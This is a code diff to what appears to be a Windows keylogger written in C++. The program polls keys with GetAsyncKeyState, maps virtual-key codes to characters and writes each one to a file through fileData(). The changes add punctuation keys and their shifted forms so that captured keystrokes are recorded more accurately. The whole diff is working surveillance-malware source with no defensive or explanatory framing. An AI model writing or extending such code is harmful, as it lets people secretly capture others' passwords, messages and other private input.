@@ -19,7 +19,7 @@ std::string specialKey(int keyPressed) {
     translatedKey = "notspecial";
     //Space
     if(keyPressed == VK_SPACE) {
-        translatedKey = " ";
+        translatedKey = "[SPACE]";
     //Enter
     } else if(keyPressed == VK_RETURN){
         translatedKey = "\n";
@@ -41,11 +41,36 @@ std::string specialKey(int keyPressed) {
     //Alt
     } else if(keyPressed == VK_MENU) {
         translatedKey = "[ALT]";
-    // Forward Slash
+    // Comma ,
+    } else if(keyPressed == VK_OEM_COMMA){
+        translatedKey = ",";
+    // Minus -
+    } else if(keyPressed == VK_OEM_MINUS){
+        translatedKey = "-";
+    // Period .
+    } else if(keyPressed == VK_OEM_PERIOD) {
+        translatedKey = ".";
+    // Left Bracket [
+    } else if(keyPressed == VK_OEM_4) {
+        translatedKey = "[";
+    // Backward Slash \ 
+    } else if(keyPressed == VK_OEM_5) {
+        translatedKey = "\\";
+    // Right Bracket ]
+    } else if(keyPressed == VK_OEM_6) {
+        translatedKey = "]";
+    // Single Quote
+    } else if(keyPressed == VK_OEM_7) {
+        translatedKey = "'";
+    // Forward Slash /
     } else if(keyPressed == 0xBF) {
         translatedKey = "/";
+    // Apostrophe ~
     } else if(keyPressed == 0xC0) {
-        translatedKey = "~";
+        translatedKey = "`";
+    // Equals =
+    } else if(keyPressed == 0xBB) {
+        translatedKey = "=";
     };
 
     return translatedKey;
@@ -76,6 +101,24 @@ int main() {
                     if(GetAsyncKeyState(VK_SHIFT)) {
                         if(res == "/") {
                             res = "?";
+                        } else if(res == "=") {
+                            res = "+";
+                        } else if (res == ",") {
+                            res = "<";
+                        } else if (res == "-") {
+                            res = "_";
+                        } else if (res == ".") {
+                            res = ">";
+                        } else if (res == "`") {
+                            res = "~";
+                        } else if (res == "[") {
+                            res = "{";
+                        } else if (res == "]") {
+                            res = "}";
+                        } else if (res == "\\") {
+                            res = "|";
+                        } else if (res ==  "'") {
+                            res = "\"";
                         }
                     }
                     fileData(res);
